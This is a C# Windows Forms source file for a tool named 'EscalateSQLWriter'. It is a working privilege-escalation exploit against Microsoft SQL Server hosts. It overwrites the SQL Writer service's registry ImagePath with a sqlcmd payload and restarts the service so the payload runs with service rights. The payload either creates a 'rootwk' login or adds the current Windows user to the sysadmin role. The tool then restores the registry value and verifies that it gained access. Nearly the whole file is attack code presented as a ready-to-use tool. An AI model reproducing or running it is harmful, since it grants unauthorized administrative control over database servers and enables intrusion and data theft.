using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.Win32;

namespace EscalateSQLWriter
{
    public partial class MainForm : Form
    {
        private string _sqlWriterRegPath = @"SYSTEM\CurrentControlSet\Services\SQLWriter";
        private string _sqlcmdPath = null;
        private string _originalImagePath = null;
        private string _backupFile = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "SQLWriter_Backup.reg");
        private string _currentLang = "PL"; // Default Polish

        // Dictionary<Key, Dictionary<Lang, Text>>
        private Dictionary<string, Dictionary<string, string>> _loc = new Dictionary<string, Dictionary<string, string>>() {
            { "BtnScan", new Dictionary<string, string> { { "PL", "1. Skanuj System" }, { "EN", "1. Scan System" } } },
            { "LblService", new Dictionary<string, string> { { "PL", "2. Wybierz usługę SQL:" }, { "EN", "2. Select SQL Service:" } } },
            { "GrpMode", new Dictionary<string, string> { { "PL", "3. Wybierz cel ataku" }, { "EN", "3. Select Target Mode" } } },
            { "RbWinUser", new Dictionary<string, string> { { "PL", "Obecny użytkownik Windows" }, { "EN", "Current Windows User" } } },
            { "RbSqlUser", new Dictionary<string, string> { { "PL", "Konto SQL (rootwk)" }, { "EN", "SQL Account (rootwk)" } } },
            { "LblPass", new Dictionary<string, string> { { "PL", "Hasło:" }, { "EN", "Password:" } } },
            { "BtnExploit", new Dictionary<string, string> { { "PL", "4. Uruchom Exploit" }, { "EN", "4. Run Exploit" } } },
            { "MsgAdminFail", new Dictionary<string, string> { { "PL", "UWAGA: Program nie ma uprawnień Administratora." }, { "EN", "WARNING: Program does not have Administrator privileges." } } },
            { "MsgAdminFail2", new Dictionary<string, string> { { "PL", "Wiele funkcji nie będzie działać." }, { "EN", "Many functions will not work." } } },
            { "MsgAdminOK", new Dictionary<string, string> { { "PL", "Uprawnienia Administratora: OK" }, { "EN", "Administrator Privileges: OK" } } },
            { "MsgScanStart", new Dictionary<string, string> { { "PL", "Rozpoczynanie skanowania..." }, { "EN", "Starting scan..." } } },
            { "MsgErrKey", new Dictionary<string, string> { { "PL", "BŁĄD: Nie znaleziono klucza SQL Writer!" }, { "EN", "ERROR: SQL Writer registry key not found!" } } },
            { "MsgBackup", new Dictionary<string, string> { { "PL", "Wykonywanie backupu rejestru..." }, { "EN", "Backing up registry..." } } },
            { "MsgBackupOK", new Dictionary<string, string> { { "PL", "Backup zapisano w: " }, { "EN", "Backup saved to: " } } },
            { "MsgBackupFail", new Dictionary<string, string> { { "PL", "Ostrzeżenie: Nie udało się utworzyć pliku backupu." }, { "EN", "Warning: Failed to create backup file." } } },
            { "MsgErrSqlCmd", new Dictionary<string, string> { { "PL", "BŁĄD: Nie znaleziono sqlcmd.exe." }, { "EN", "ERROR: sqlcmd.exe not found." } } },
            { "MsgFoundSqlCmd", new Dictionary<string, string> { { "PL", "Znaleziono sqlcmd: " }, { "EN", "Found sqlcmd: " } } },
            { "MsgSearchSvc", new Dictionary<string, string> { { "PL", "Szukanie usług SQL Server..." }, { "EN", "Searching for SQL Server services..." } } },
            { "MsgNoSvc", new Dictionary<string, string> { { "PL", "Nie znaleziono uruchomionych usług SQL Server." }, { "EN", "No running SQL Server services found." } } },
            { "MsgSvcFound", new Dictionary<string, string> { { "PL", "Znaleziono usług: " }, { "EN", "Found services: " } } },
            { "MsgReady", new Dictionary<string, string> { { "PL", "Gotowe do ataku. Wybierz usługę, cel i kliknij przycisk." }, { "EN", "Ready. Select service, target, and click button." } } },
            { "MsgErrScan", new Dictionary<string, string> { { "PL", "Błąd podczas skanowania: " }, { "EN", "Error during scan: " } } },
            { "MsgPassReq", new Dictionary<string, string> { { "PL", "Podaj hasło dla użytkownika rootwk!" }, { "EN", "Enter password for rootwk user!" } } },
            { "MsgPassComp", new Dictionary<string, string> { { "PL", "Hasło musi mieć min. 8 znaków i zawierać 3 z 4 grup: duże, małe litery, cyfry, symbole." }, { "EN", "Password must be min. 8 chars and contain 3 of 4 groups: upper, lower, digits, symbols." } } },
            { "MsgStartProc", new Dictionary<string, string> { { "PL", "--- Rozpoczynanie procedury ---" }, { "EN", "--- Starting Procedure ---" } } },
            { "MsgTarget", new Dictionary<string, string> { { "PL", "Cel: " }, { "EN", "Target: " } } },
            { "MsgModeSQL", new Dictionary<string, string> { { "PL", "Tryb: Utworzenie użytkownika SQL 'rootwk'" }, { "EN", "Mode: Create SQL user 'rootwk'" } } },
            { "MsgModeWin", new Dictionary<string, string> { { "PL", "Tryb: Dodanie użytkownika Windows: " }, { "EN", "Mode: Add Windows user: " } } },
            { "MsgModReg", new Dictionary<string, string> { { "PL", "Modyfikacja rejestru SQL Writer..." }, { "EN", "Modifying SQL Writer registry..." } } },
            { "MsgStopSvc", new Dictionary<string, string> { { "PL", "Zatrzymywanie usługi SQL Writer..." }, { "EN", "Stopping SQL Writer service..." } } },
            { "MsgStartSvc", new Dictionary<string, string> { { "PL", "Uruchamianie exploita (Start Service)..." }, { "EN", "Starting exploit (Start Service)..." } } },
            { "MsgSvcErrExp", new Dictionary<string, string> { { "PL", "Usługa zgłosiła błąd (oczekiwane - payload wykonany)." }, { "EN", "Service reported error (expected - payload executed)." } } },
            { "MsgRestReg", new Dictionary<string, string> { { "PL", "Przywracanie rejestru..." }, { "EN", "Restoring registry..." } } },
            { "MsgRestSvc", new Dictionary<string, string> { { "PL", "Przywracanie usługi SQL Writer do stanu normalnego..." }, { "EN", "Restoring SQL Writer service to normal state..." } } },
            { "MsgSvcOK", new Dictionary<string, string> { { "PL", "Usługa SQL Writer działa." }, { "EN", "SQL Writer service is running." } } },
            { "MsgSvcFail", new Dictionary<string, string> { { "PL", "Problem z uruchomieniem usługi: " }, { "EN", "Problem starting service: " } } },
            { "MsgVerify", new Dictionary<string, string> { { "PL", "Weryfikacja dostępu..." }, { "EN", "Verifying access..." } } },
            { "MsgSuccess", new Dictionary<string, string> { { "PL", "WERYFIKACJA POMYŚLNA!" }, { "EN", "VERIFICATION SUCCESSFUL!" } } },
            { "MsgFailVerify", new Dictionary<string, string> { { "PL", "Weryfikacja nieudana lub brak outputu." }, { "EN", "Verification failed or no output." } } },
            { "MsgCritErr", new Dictionary<string, string> { { "PL", "Błąd krytyczny: " }, { "EN", "Critical Error: " } } },
            { "MsgRestTry", new Dictionary<string, string> { { "PL", "Próbowano przywrócić rejestr po błędzie." }, { "EN", "Attempted to restore registry after error." } } }
        };

        public MainForm()
        {
            InitializeComponent();
            cmbLanguage.SelectedIndex = 0; // Default PL
            CheckAdmin();
        }

        private string GetText(string key)
        {
            if (_loc.ContainsKey(key) && _loc[key].ContainsKey(_currentLang))
            {
                return _loc[key][_currentLang];
            }
            return key;
        }

        private void cmbLanguage_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (cmbLanguage.SelectedIndex == 0) _currentLang = "PL";
            else _currentLang = "EN";

            UpdateUI();
        }

        private void UpdateUI()
        {
            btnScan.Text = GetText("BtnScan");
            lblService.Text = GetText("LblService");
            grpMode.Text = GetText("GrpMode");
            rbWinUser.Text = GetText("RbWinUser");
            rbSqlUser.Text = GetText("RbSqlUser");
            lblPass.Text = GetText("LblPass");
            btnExploit.Text = GetText("BtnExploit");
        }

        private void CheckAdmin()
        {
            if (!IsAdministrator())
            {
                Log(GetText("MsgAdminFail"), Color.Red);
                Log(GetText("MsgAdminFail2"), Color.Red);
                btnScan.Enabled = false;
            }
            else
            {
                Log(GetText("MsgAdminOK"), Color.Green);
            }
        }

        private bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        private void Log(string message, Color? color = null)
        {
            if (txtLog.InvokeRequired)
            {
                txtLog.Invoke(new Action(() => Log(message, color)));
                return;
            }

            txtLog.SelectionStart = txtLog.TextLength;
            txtLog.SelectionLength = 0;
            txtLog.SelectionColor = color ?? Color.Lime;
            txtLog.AppendText($"[{DateTime.Now:HH:mm:ss}] {message}{Environment.NewLine}");
            txtLog.SelectionColor = txtLog.ForeColor;
            txtLog.ScrollToCaret();
        }

        private void rbSqlUser_CheckedChanged(object sender, EventArgs e)
        {
            txtPassword.Enabled = rbSqlUser.Checked;
        }

        private void btnScan_Click(object sender, EventArgs e)
        {
            btnScan.Enabled = false;
            cmbServices.Items.Clear();
            cmbServices.Enabled = false;
            btnExploit.Enabled = false;
            _sqlcmdPath = null;
            _originalImagePath = null;
            grpMode.Enabled = false;

            System.Threading.Tasks.Task.Run(() => PerformScan());
        }

        private void PerformScan()
        {
            try
            {
                Log(GetText("MsgScanStart"));

                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(_sqlWriterRegPath))
                {
                    if (key == null)
                    {
                        Log(GetText("MsgErrKey"), Color.Red);
                        return;
                    }
                    _originalImagePath = key.GetValue("ImagePath") as string;
                }
                Log($"SQL Writer ImagePath: {_originalImagePath}", Color.White);

                Log(GetText("MsgBackup"));
                ProcessStartInfo regExport = new ProcessStartInfo("reg.exe", $"export \"HKLM\\{_sqlWriterRegPath}\" \"{_backupFile}\" /y");
                regExport.WindowStyle = ProcessWindowStyle.Hidden;
                regExport.CreateNoWindow = true;
                regExport.UseShellExecute = false;

                var regProc = Process.Start(regExport);
                regProc.WaitForExit();

                if (File.Exists(_backupFile))
                    Log(GetText("MsgBackupOK") + _backupFile, Color.Green);
                else
                    Log(GetText("MsgBackupFail"), Color.Yellow);

                _sqlcmdPath = FindSqlCmd();
                if (string.IsNullOrEmpty(_sqlcmdPath))
                {
                    Log(GetText("MsgErrSqlCmd"), Color.Red);
                    return;
                }
                Log(GetText("MsgFoundSqlCmd") + _sqlcmdPath, Color.Green);

                Log(GetText("MsgSearchSvc"));
                var sqlServices = ServiceController.GetServices()
                    .Where(s => (s.ServiceName == "MSSQLSERVER" || s.ServiceName.StartsWith("MSSQL$")) && s.Status == ServiceControllerStatus.Running)
                    .ToList();

                if (sqlServices.Count == 0)
                {
                    Log(GetText("MsgNoSvc"), Color.Red);
                    return;
                }

                this.Invoke(new Action(() =>
                {
                    foreach (var svc in sqlServices)
                    {
                        cmbServices.Items.Add(svc.ServiceName);
                    }
                    if (cmbServices.Items.Count > 0)
                    {
                        cmbServices.SelectedIndex = 0;
                        cmbServices.Enabled = true;
                        btnExploit.Enabled = true;
                    }
                }));

                Log(GetText("MsgSvcFound") + sqlServices.Count, Color.Green);
                Log(GetText("MsgReady"), Color.Cyan);
            }
            catch (Exception ex)
            {
                Log(GetText("MsgErrScan") + ex.Message, Color.Red);
            }
            finally
            {
                this.Invoke(new Action(() => {
                    btnScan.Enabled = true;
                    grpMode.Enabled = true;
                }));
            }
        }

        private string FindSqlCmd()
        {
            var pathEnv = Environment.GetEnvironmentVariable("PATH");
            if (pathEnv != null)
            {
                var paths = pathEnv.Split(';');
                foreach (var path in paths)
                {
                    string fullPath = Path.Combine(path, "sqlcmd.exe");
                    if (File.Exists(fullPath)) return fullPath;
                }
            }

            string[] searchPaths = {
                @"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC",
                @"C:\Program Files\Microsoft SQL Server"
            };

            foreach (var basePath in searchPaths)
            {
                if (Directory.Exists(basePath))
                {
                    try
                    {
                        var files = Directory.GetFiles(basePath, "sqlcmd.exe", SearchOption.AllDirectories);
                        if (files.Length > 0) return files[0];
                    }
                    catch { }
                }
            }
            return null;
        }

        private bool ValidatePassword(string password)
        {
            if (string.IsNullOrEmpty(password)) return false;
            if (password.Length < 8) return false;

            int score = 0;
            if (Regex.IsMatch(password, @"[a-z]")) score++;
            if (Regex.IsMatch(password, @"[A-Z]")) score++;
            if (Regex.IsMatch(password, @"[0-9]")) score++;
            if (Regex.IsMatch(password, @"[\W_]")) score++; // Symbols

            return score >= 3;
        }

        private void btnExploit_Click(object sender, EventArgs e)
        {
            if (cmbServices.SelectedItem == null) return;
            string serviceName = cmbServices.SelectedItem.ToString();

            bool useSqlAuth = rbSqlUser.Checked;
            string password = txtPassword.Text;

            if (useSqlAuth)
            {
                if (string.IsNullOrWhiteSpace(password))
                {
                    MessageBox.Show(GetText("MsgPassReq"), "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                if (!ValidatePassword(password))
                {
                    MessageBox.Show(GetText("MsgPassComp"), "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }
            }

            btnScan.Enabled = false;
            btnExploit.Enabled = false;
            cmbServices.Enabled = false;
            grpMode.Enabled = false;

            System.Threading.Tasks.Task.Run(() => RunExploit(serviceName, useSqlAuth, password));
        }

        private void RunExploit(string serviceName, bool useSqlAuth, string password)
        {
            try
            {
                Log(GetText("MsgStartProc"), Color.Cyan);

                string serverInstance = ".";
                if (serviceName != "MSSQLSERVER")
                {
                    string instance = serviceName.Substring(6);
                    serverInstance = $".\\{instance}";
                }
                Log(GetText("MsgTarget") + serverInstance);

                string sqlQuery;

                if (useSqlAuth)
                {
                    Log(GetText("MsgModeSQL"));
                    string safePass = password.Replace("'", "''");
                    sqlQuery = $"IF NOT EXISTS (SELECT * FROM sys.sql_logins WHERE name='rootwk') BEGIN CREATE LOGIN [rootwk] WITH PASSWORD=N'{safePass}', CHECK_POLICY=OFF; END ELSE BEGIN ALTER LOGIN [rootwk] WITH PASSWORD=N'{safePass}'; END; ALTER SERVER ROLE [sysadmin] ADD MEMBER [rootwk];";
                }
                else
                {
                    string currentUser = WindowsIdentity.GetCurrent().Name;
                    Log(GetText("MsgModeWin") + currentUser);
                    sqlQuery = $"IF NOT EXISTS (SELECT name FROM sys.sql_logins WHERE name = N'{currentUser}') BEGIN CREATE LOGIN [{currentUser}] FROM WINDOWS; END; ALTER SERVER ROLE [sysadmin] ADD MEMBER [{currentUser}];";
                }

                string escapedQuery = sqlQuery.Replace("\"", "\"\"");
                string payload = $"\"{_sqlcmdPath}\" -S {serverInstance} -Q \"{escapedQuery}\"";

                Log(GetText("MsgModReg"), Color.Yellow);
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(_sqlWriterRegPath, true))
                {
                    key.SetValue("ImagePath", payload, RegistryValueKind.ExpandString);
                }

                Log(GetText("MsgStopSvc"), Color.Yellow);
                ServiceController sc = new ServiceController("SQLWriter");
                if (sc.Status != ServiceControllerStatus.Stopped)
                {
                    sc.Stop();
                    sc.WaitForStatus(ServiceControllerStatus.Stopped, TimeSpan.FromSeconds(30));
                }

                Log(GetText("MsgStartSvc"), Color.Yellow);
                try
                {
                    sc.Start();
                    sc.WaitForStatus(ServiceControllerStatus.Running, TimeSpan.FromSeconds(10));
                }
                catch
                {
                    Log(GetText("MsgSvcErrExp"), Color.Green);
                }

                Log(GetText("MsgRestReg"), Color.Cyan);
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(_sqlWriterRegPath, true))
                {
                    key.SetValue("ImagePath", _originalImagePath, RegistryValueKind.ExpandString);
                }

                Log(GetText("MsgRestSvc"), Color.Cyan);
                sc.Refresh();
                try
                {
                     if (sc.Status != ServiceControllerStatus.Stopped)
                     {
                         sc.Stop();
                         sc.WaitForStatus(ServiceControllerStatus.Stopped);
                     }
                     sc.Start();
                     Log(GetText("MsgSvcOK"), Color.Green);
                }
                catch (Exception ex)
                {
                    Log(GetText("MsgSvcFail") + ex.Message, Color.Yellow);
                }

                Log(GetText("MsgVerify"), Color.Cyan);
                string testQuery;
                string authArgs;

                if (useSqlAuth)
                {
                   testQuery = "SELECT 'SUKCES: rootwk sysadmin on ' + @@SERVERNAME";
                   string cmdPass = password.Replace("\"", "\\\"");
                   authArgs = $"-U rootwk -P \"{cmdPass}\"";
                }
                else
                {
                   testQuery = "SELECT 'SUKCES: ' + SYSTEM_USER + ' sysadmin on ' + @@SERVERNAME";
                   authArgs = "-E";
                }

                ProcessStartInfo testInfo = new ProcessStartInfo(_sqlcmdPath, $"-S {serverInstance} {authArgs} -Q \"{testQuery}\"");
                testInfo.UseShellExecute = false;
                testInfo.RedirectStandardOutput = true;
                testInfo.CreateNoWindow = true;

                var proc = Process.Start(testInfo);
                string output = proc.StandardOutput.ReadToEnd();
                proc.WaitForExit();

                if (proc.ExitCode == 0 && output.Contains("SUKCES"))
                {
                    Log(GetText("MsgSuccess"), Color.Green);
                    Log(output.Trim(), Color.Green);
                }
                else
                {
                    Log(GetText("MsgFailVerify"), Color.Red);
                    Log($"Output: {output}", Color.White);
                }

            }
            catch (Exception ex)
            {
                Log(GetText("MsgCritErr") + ex.Message, Color.Red);
                try
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(_sqlWriterRegPath, true))
                    {
                        key.SetValue("ImagePath", _originalImagePath, RegistryValueKind.ExpandString);
                    }
                    Log(GetText("MsgRestTry"), Color.Orange);
                }
                catch { }
            }
            finally
            {
                this.Invoke(new Action(() =>
                {
                    btnScan.Enabled = true;
                    btnExploit.Enabled = true;
                    cmbServices.Enabled = true;
                    grpMode.Enabled = true;
                }));
            }
        }
    }
}
